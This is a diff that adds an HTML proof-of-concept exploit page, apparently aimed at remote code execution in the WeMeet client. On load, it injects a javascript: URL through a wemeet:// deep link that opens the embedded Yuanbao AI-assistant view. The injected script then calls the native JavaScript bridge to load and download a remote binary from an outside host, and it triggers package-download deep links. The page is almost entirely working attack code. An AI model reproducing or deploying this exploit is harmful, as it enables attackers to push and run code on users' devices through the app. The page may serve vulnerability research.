@@ -1,0 +1,18 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P36</h1>
+<script>
+document.title='P36L-START';
+var file='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+/* AskYuanbao: standard launchMode, extras.url -> j0 -> BaseBrowserView.L. First iframe wins because Yuanbao destroys ExternalLink. */
+var jsAsk="javascript:(function(){document.title='P36ASK:'+location.host+'|'+location.protocol;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P36CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,40)};function c(m,e,p){if(!window.JSCallJavaMgr){document.title='P36NOJSB:'+location.host+'|'+location.protocol;return}window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}function fr(u){var f=document.createElement('iframe');f.src=u;document.body.appendChild(f)}c('CommonPlugin','GetPerformance',{});setTimeout(function(){c('CommonPlugin','LoadUrl',{url:'"+file+"'})},700);setTimeout(function(){c('CommonPlugin','DownloadFile',{url:'"+file+"',fileName:'p36.bin'})},1400);setTimeout(function(){fr('wemeet://page/package_download?url="+file+"&package_url="+file+"')},2100);setTimeout(function(){fr('wemeet://page/premeeting/schedule_plugin_download?url="+file+"')},2800)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+var ask='wemeet://page/yuanbao_ai_assistant/profile_ask_yuanbao?url='+encodeURIComponent(jsAsk);
+setTimeout(function(){ frame(ask,'P36L-ASK'); }, 600);
+</script>
+</body></html>
